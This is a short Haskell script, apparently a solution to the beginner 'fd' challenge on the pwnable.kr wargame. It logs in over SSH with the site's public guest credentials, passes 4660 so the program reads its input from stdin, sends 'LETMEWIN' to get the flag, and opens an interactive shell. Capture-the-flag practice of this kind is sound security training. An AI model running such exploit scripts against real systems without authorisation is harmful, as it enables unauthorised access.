{-# LANGUAGE OverloadedStrings #-}

import           Control.Monad.IO.Class
import qualified Data.ByteString.Char8  as BS
import           Pwn

main :: IO ()
main = pwn $ do
  s <- sshWith "fd" "pwnable.kr" defaultSSHConfig { port = 2222
                                                  , password = "guest" }

  c1 <- sshProcess s ["cat", "fd.c"]
  recv c1 >>= liftIO . BS.putStr
  close c1

  c2 <- sshProcess s ["~/fd", "4660"]
  sendline c2 "LETMEWIN"
  recv c2 >>= liftIO . BS.putStr
  close c2

  c3 <- sshShell s
  interactive c3
  close c3

  closeSSH s
